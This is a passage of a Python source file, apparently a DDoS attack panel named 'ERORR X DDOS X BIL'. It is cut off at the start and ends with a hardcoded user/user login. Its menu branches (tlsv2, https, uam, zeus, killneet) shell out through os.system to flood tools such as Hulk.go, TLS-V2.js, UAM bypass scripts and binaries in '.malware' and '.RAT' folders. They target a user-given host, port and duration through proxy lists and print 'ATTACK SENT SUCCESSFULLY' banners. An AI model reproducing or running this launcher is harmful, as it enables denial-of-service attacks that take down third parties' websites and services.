				os.system(f'screen -dm go run Hulk.go -site {url} -data {method}')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   SYSTEM:	\033[31m[\033[36m {method}\033[31m ]
\033[1;37m   METHOD: 	\033[31m[\033[36m bomb2\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "tlsv2" or sinput == "TLSV2":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node TLS-V2.js {url} {time} {port} 10')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m tlsv2\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "https" or sinput == "HTTPS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node cobra.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m https\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:        \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:         \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:     \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()			    
		elif sinput == "uam" or sinput == "UAM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node UAM.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m uam\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "killneet" or sinput == "KILLNEET":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
				os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd .randomstring && cd examples && screen -dm java input2.java {host} 8000')
				os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 64 3 500')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 1')
				os.system(f'cd /media && screen -dm node HTTP.js {host} 500 5 {time}')
				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         âââââ¦âââ¦ââââââââ¦ââ \033[1;37mâââââââââââ¦â
\033[35m                         â ââ£ â  â â ââ£â  â â©â\033[1;37m âââââ£ âââ â
\033[35m                         â© â© â©  â© â© â©ââââ© â©\033[1;37m âââââââââ â©
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ââ¦âââââââââââââââââââââââââââââââââââââââââââââ¦â
\033[35m           âââââââ©âââââââââââââââââââââââââââââââââââââââââââââ©ââââââ
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[1;37mKILLNET \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
""")
			except ValueError:
				main()
			except IndexError:
				main()			    			    
		elif sinput == "zeus" or sinput == "ZEUS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node ZEUS.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m zeus\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
                

		
def login():
    os.system("clear")
    user = "user"
    passwd = "user"
    username = input("""







                           \33[0;34mLOGIN TO ERORR X DDOS X BIL : """)
    password = getpass.getpass(prompt="""
                            \33[0;34mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""
                              \033[1;31;40mBUY""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""
                         \33[0;32mWELLCOME  ERORR X DDOS X BIL""")
        time.sleep(0.3)
    menu()
    main()


login()
